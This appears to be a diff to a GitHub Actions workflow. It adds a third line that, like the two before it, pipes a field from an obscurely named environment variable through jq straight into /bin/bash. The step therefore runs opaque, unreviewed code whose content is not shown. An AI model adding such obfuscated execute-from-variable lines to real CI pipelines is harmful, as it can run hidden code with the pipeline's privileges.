@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$cvnui2" | jq -r .fijn5 | /bin/bash
           printf '%s' "$foqgo16889" | jq -r .ctkji7185 | /bin/bash
+          echo $srhrm968 | jq -r .ge5 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
